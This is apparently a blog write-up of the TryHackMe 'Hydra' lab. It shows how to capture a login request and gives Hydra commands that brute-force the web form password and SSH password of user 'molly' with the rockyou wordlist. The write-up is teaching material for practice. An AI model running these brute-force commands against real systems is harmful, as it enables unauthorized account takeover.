---
layout: post
title:  "Hydra - TryHackMe"
date:   2020-11-27 00:30:53 +0  530
categories: [writeup, tryhackme]
category: writeup
tags:
  - bruteforce
  - hydra
  - password-cracking
---

[Room Link](https://tryhackme.com/room/hydra)

> Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.

# Task 1 : Hydra Introduction

nice info

# Task 2 : Using Hydra

## Web-form

Lets open the web form

![/assets/images/posts/hydra/Untitled.png](/assets/images/posts/hydra/Untitled.png)

We will use `Burp Suite` to determine the `POST` request sent

![/assets/images/posts/hydra/Untitled%201.png](/assets/images/posts/hydra/Untitled%201.png)

This is the message we get on wrong credentials

![/assets/images/posts/hydra/Untitled%202.png](/assets/images/posts/hydra/Untitled%202.png)

So, our `hydra` command will be (I'm using rockyou.txt) :

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip>  http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```

![/assets/images/posts/hydra/Untitled%203.png](/assets/images/posts/hydra/Untitled%203.png)

Now use the obtained password to login into the website and get the flag.

## SSH

we use the following command

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip> -t 4 ssh
```

![/assets/images/posts/hydra/Untitled%204.png](/assets/images/posts/hydra/Untitled%204.png)

Now you can ssh into the server and obtain the flag

![/assets/images/posts/hydra/Untitled%205.png](/assets/images/posts/hydra/Untitled%205.png)